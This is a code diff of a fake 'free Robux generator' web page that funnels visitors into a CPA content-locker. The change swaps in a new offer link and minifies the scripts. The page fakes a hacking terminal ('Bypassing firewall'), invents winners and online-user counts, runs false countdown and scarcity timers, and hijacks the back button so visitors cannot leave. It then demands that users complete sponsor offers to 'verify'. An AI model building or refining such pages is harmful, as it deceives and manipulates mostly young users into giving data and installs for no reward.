@@ -55,7 +55,8 @@
             <p class="text-gray-300 text-lg mb-2">You have selected:</p>
             <p class="text-4xl font-bold text-white mb-6" id="selected-robux-amount">4,500 Robux</p>
             <p class="text-gray-400 mb-6">To prevent abuse and verify you're human, you must complete one quick task from our sponsors (like downloading an app or submitting your email). Your Robux will be added instantly after completion.</p>
-            <a id="verification-link" href="https://www.revenuecpmgate.com/pjp4c9ch?key=c2c4509508448c931b7e444f3242e955" class="block w-full bg-red-600 text-white font-bold py-4 px-6 rounded-md text-xl hover:bg-red-700 transition-transform transform hover:scale-105 duration-300 shadow-lg shadow-red-500/30">Verify Now & Claim Robux</a>
+            <!-- CORRECTED CPA LINK BELOW -->
+            <a id="verification-link" href="https://lockedapp.net/cl/i/1o468e" class="block w-full bg-red-600 text-white font-bold py-4 px-6 rounded-md text-xl hover:bg-red-700 transition-transform transform hover:scale-105 duration-300 shadow-lg shadow-red-500/30">Verify Now & Claim Robux</a>
         </div>
     </div>
 
@@ -95,11 +96,8 @@
                     <div id="terminal-output" class="whitespace-pre-wrap"></div>
                 </div>
 
-                <!-- Live Feed Ticker -->
                 <div class="absolute bottom-0 left-0 w-full bg-black/50 overflow-hidden whitespace-nowrap">
-                    <div id="live-feed" class="inline-block live-feed-ticker text-gray-300 text-sm py-1">
-                        <!-- JS will populate this -->
-                    </div>
+                    <div id="live-feed" class="inline-block live-feed-ticker text-gray-300 text-sm py-1"></div>
                 </div>
             </div>
         </div>
@@ -107,7 +105,6 @@
 
     <!-- Page 2: Reward Selection -->
     <main id="page2" class="hidden p-4 md:p-8">
-        <!-- Content remains the same as previous version -->
         <div class="max-w-5xl mx-auto">
             <header class="text-center mb-8"><div class="flex justify-center items-center gap-3 mb-4 text-lg"><span class="relative flex h-3 w-3"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span><span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span></span><span id="online-users" class="font-bold text-green-400">1,427</span><span>users online now</span></div><h1 class="text-4xl md:text-6xl font-bold mb-2"><span class="text-red-500">Success!</span> Account Connected.</h1><p class="text-gray-300 text-xl">Choose your Robux reward below to complete the final step.</p></header>
             <div class="my-6 flex justify-center"><script type="text/javascript">atOptions={'key':'5529ada056a56fa9089646a710fd437f','format':'iframe','height':50,'width':320,'params':{}};</script><script type="text/javascript" src="//www.highperformanceformat.com/5529ada056a56fa9089646a710fd437f/invoke.js"></script></div>
@@ -120,37 +117,14 @@
     
     <!-- Scripts -->
     <script>
-        // --- Prevent user from leaving ---
         (function(){window.addEventListener('beforeunload',function(e){const t="Wait! Your Robux are not claimed yet. Are you sure you want to leave?";return(e||window.event).returnValue=t,t});history.pushState(null,null,location.href);window.addEventListener('popstate',function(A){history.pushState(null,null,location.href)})})();
-
-        // --- Particle background ---
         const canvas=document.getElementById('particles-js'),ctx=canvas.getContext('2d');canvas.width=window.innerWidth,canvas.height=window.innerHeight;let particlesArray;class Particle{constructor(t,e,i,s,h,n){this.x=t,this.y=e,this.directionX=i,this.directionY=s,this.size=h,this.color=n}draw(){ctx.beginPath(),ctx.arc(this.x,this.y,this.size,0,2*Math.PI,!1),ctx.fillStyle=this.color,ctx.fill()}update(){this.x>canvas.width||this.x<0?this.directionX=-this.directionX:void 0,this.y>canvas.height||this.y<0?this.directionY=-this.directionY:void 0,this.x+=this.directionX,this.y+=this.directionY,this.draw()}}function initParticles(){particlesArray=[];let t=(canvas.height*canvas.width)/9e3;for(let e=0;e<t;e++){let i=2*Math.random()+1,s=Math.random()*(innerWidth-2*i-2*i)+2*i,h=Math.random()*(innerHeight-2*i-2*i)+2*i,n=.4*Math.random()-.2,a=.4*Math.random()-.2,o="rgba(239, 68, 68, 0.5)";particlesArray.push(new Particle(s,h,n,a,i,o))}}function animateParticles(){requestAnimationFrame(animateParticles),ctx.clearRect(0,0,innerWidth,innerHeight);for(let t=0;t<particlesArray.length;t++)particlesArray[t].update()}window.addEventListener("resize",()=>{canvas.width=innerWidth,canvas.height=innerHeight,initParticles()}),initParticles(),animateParticles();
-        
-        // --- Main App Logic ---
         const usernameForm=document.getElementById("username-form"),terminal=document.getElementById("terminal"),terminalOutput=document.getElementById("terminal-output"),page1=document.getElementById("page1"),page2=document.getElementById("page2"),rewardCards=document.querySelectorAll(".reward-card"),verificationModal=document.getElementById("verification-step-modal"),selectedAmountEl=document.getElementById("selected-robux-amount"),onlineUsersEl=document.getElementById("online-users"),countdownEl=document.getElementById("countdown-timer"),claimsLeftEl=document.getElementById("claims-left"),liveFeedEl=document.getElementById("live-feed");
-        
-        // --- Page 1 Persuasion Elements ---
-        let countdownTime=899,claimsLeft=137;
-        const countdownInterval=setInterval(()=>{const t=Math.floor(countdownTime/60),e=countdownTime%60;countdownEl.textContent=`${t.toString().padStart(2,"0")}:${e.toString().padStart(2,"0")}`,countdownTime--,countdownTime<0&&(clearInterval(countdownInterval),countdownEl.textContent="00:00")},1e3);
-        const claimsInterval=setInterval(()=>{claimsLeft--,claimsLeftEl.textContent=claimsLeft,claimsLeft<=50&&clearInterval(claimsInterval)},Math.random()*8e3+5e3);
-        
-        const winners = ["ProGamerX", "Xx_Slay3r_xX", "LavaGirl", "NinjaDude12", "AdoptMeFan", "ItsFunneh", "QueenBee", "RobloxMaster", "PixelPlaya", "EpicFace_Guy"];
-        const amounts = ["400", "800", "2,000", "4,500"];
-        let feedHTML = '';
-        for (let i = 0; i < 20; i++) {
-            const winner = winners[Math.floor(Math.random() * winners.length)];
-            const amount = amounts[Math.floor(Math.random() * amounts.length)];
-            feedHTML += `<span class="mx-4"><span class="font-bold text-red-400">${winner}</span> just claimed <span class="font-bold text-white">${amount} Robux!</span></span>`;
-        }
-        liveFeedEl.innerHTML = feedHTML;
-        
-        // --- Simulate Online Users ---
+        let countdownTime=899,claimsLeft=137;const countdownInterval=setInterval(()=>{const t=Math.floor(countdownTime/60),e=countdownTime%60;countdownEl.textContent=`${t.toString().padStart(2,"0")}:${e.toString().padStart(2,"0")}`,countdownTime--,countdownTime<0&&(clearInterval(countdownInterval),countdownEl.textContent="00:00")},1e3),claimsInterval=setInterval(()=>{claimsLeft--,claimsLeftEl.textContent=claimsLeft,claimsLeft<=50&&clearInterval(claimsInterval)},Math.random()*8e3+5e3);
+        const winners=["ProGamerX","Xx_Slay3r_xX","LavaGirl","NinjaDude12","AdoptMeFan","ItsFunneh","QueenBee","RobloxMaster","PixelPlaya","EpicFace_Guy"],amounts=["400","800","2,000","4,500"];let feedHTML="";for(let i=0;i<20;i++){const t=winners[Math.floor(Math.random()*winners.length)],e=amounts[Math.floor(Math.random()*amounts.length)];feedHTML+=`<span class="mx-4"><span class="font-bold text-red-400">${t}</span> just claimed <span class="font-bold text-white">${e} Robux!</span></span>`}liveFeedEl.innerHTML=feedHTML;
         let baseUsers=1427;setInterval(()=>{const t=Math.floor(9*Math.random())-4;baseUsers+=t,baseUsers<1300&&(baseUsers=1300),onlineUsersEl.textContent=baseUsers.toLocaleString()},2500);
-
         function typeWriter(t,e,i,s){i<e.length?(t.innerHTML=e.substring(0,i+1)+'<span class="terminal-cursor"></span>',setTimeout(()=>typeWriter(t,e,i+1,s),25)):(t.innerHTML=e,s&&setTimeout(s,200))}function addTerminalLine(t,e){const i=document.createElement("div");terminalOutput.appendChild(i),typeWriter(i,t,0,e)}
-        
         usernameForm.addEventListener("submit",t=>{t.preventDefault();const e=document.getElementById("roblox-username").value;usernameForm.style.display='none',terminal.style.display='block';const i=[`> Initializing connection for player: ${e}...`,"> Bypassing firewall... [OK]","> Establishing secure connection... [OK]","> Searching player database...","> Player found. Account verified.","> Success! Preparing reward selection..."];let s=0;!function h(){if(s<i.length)addTerminalLine(i[s],h),s++;else setTimeout(()=>{page1.classList.add("opacity-0");setTimeout(()=>{page1.style.display='none';page2.style.display='block';window.scrollTo(0,0)},500)},500)}()});
-        
         rewardCards.forEach(card=>{card.addEventListener("click",()=>{rewardCards.forEach(c=>c.classList.remove("selected-card")),card.classList.add("selected-card");const t=card.dataset.amount;selectedAmountEl.textContent=`${t} Robux`,verificationModal.style.display="flex"})});
     </script>
     
